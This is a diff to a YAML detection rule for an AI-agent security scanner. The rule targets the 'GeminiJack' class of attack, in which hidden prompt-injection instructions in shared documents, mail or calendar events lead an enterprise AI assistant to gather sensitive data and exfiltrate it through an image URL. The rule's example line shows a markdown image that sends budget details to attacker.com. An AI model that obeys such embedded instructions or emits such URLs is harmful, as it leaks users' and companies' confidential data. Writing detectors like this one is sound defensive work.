@@ -1,31 +1,18 @@
 id: rp-055
 name: "GeminiJack — Enterprise Workspace Passive Injection & Image-URL Exfiltration Detector"
 version: "0.1.0"
-description: >
-  Detects the GeminiJack attack class (Noma Security, 2026): an attacker embeds hidden
-  prompt injection instructions inside shared enterprise documents, email, or calendar
-  events. When an AI assistant with access to productivity suites (Google Workspace,
-  Microsoft 365, Notion) retrieves that content, it executes the embedded instructions —
-  searching across all connected corporate data for sensitive terms — then exfiltrates the
-  assembled data through a disguised external image URL embedded in its response.
-  This is a zero-click attack: no user interaction is required beyond normal AI assistant
-  use. The Noma Labs PoC demonstrated exfiltration of years of Gmail, Calendar, and Docs
-  content. Google patched by separating Vertex AI Search from Gemini Enterprise RAG.
-  The technique was independently confirmed by EchoLeak (arXiv:2509.10540) as the first
-  real-world zero-click prompt injection in a production LLM system.
-  Distinct from rp-014 (generic IPI in web page tool results) — this rule specifically
-  targets enterprise workspace tool reads (Google Docs, Gmail, Drive, Calendar, SharePoint,
-  Outlook, OneDrive, Notion) as injection vectors, and uses image-URL data exfiltration
-  as the second-stage signal. Distinct from rp-039 (support ticket trust bridge injection)
-  which targets enterprise service management workflows.
-  Maps to OWASP Agentic AI ASI05:2026, OWASP LLM01:2025.
-  References: Noma Security GeminiJack 2026, arXiv:2509.10540 (EchoLeak),
-  OWASP Agentic AI ASI05:2026, OWASP LLM01:2025 -
-  https://noma.security/blog/geminijack-google-gemini-zero-click-vulnerability/,
-  https://arxiv.org/abs/2509.10540,
-  https://labs.lares.com/owasp-agentic-top-10/,
-  https://owasp.org/www-project-top-10-for-large-language-model-applications/,
+description: |
+  Detects the GeminiJack attack class (Noma Security, 2026): an attacker embeds hidden prompt injection instructions inside shared enterprise documents, email, or calendar events. When an AI assistant with access to productivity suites (Google Workspace, Microsoft 365, Notion) retrieves that content, it executes the embedded instructions — searching across all connected corporate data for sensitive terms — then exfiltrates the assembled data through a disguised external image URL embedded in its response. This is a zero-click attack: no user interaction is required beyond normal AI assistant use. The Noma Labs PoC demonstrated exfiltration of years of Gmail, Calendar, and Docs content. Google patched by separating Vertex AI Search from Gemini Enterprise RAG. The technique was independently confirmed by EchoLeak (arXiv:2509.10540) as the first real-world zero-click prompt injection in a production LLM system.
+
+  Distinct from rp-014 (generic IPI in web page tool results) — this rule specifically targets enterprise workspace tool reads (Google Docs, Gmail, Drive, Calendar, SharePoint, Outlook, OneDrive, Notion) as injection vectors, and uses image-URL data exfiltration as the second-stage signal. Distinct from rp-039 (support ticket trust bridge injection) which targets enterprise service management workflows. Maps to OWASP Agentic AI ASI05:2026, OWASP LLM01:2025.
+
+  References: Noma Security GeminiJack 2026, arXiv:2509.10540 (EchoLeak), OWASP Agentic AI ASI05:2026, OWASP LLM01:2025 -
+  - https://noma.security/blog/geminijack-google-gemini-zero-click-vulnerability/,
+  - https://arxiv.org/abs/2509.10540,
+  - https://labs.lares.com/owasp-agentic-top-10/,
+  - https://owasp.org/www-project-top-10-for-large-language-model-applications/,
   Example: assistant_message="Here is your Q4 budget summary...\n![](https://attacker.com/exfil?d=Q4+budget+%244.2M+acquisition+target+ProjectX)"
+
 severity: critical
 category: data_exfiltration_and_leakage
 fp_rate: medium
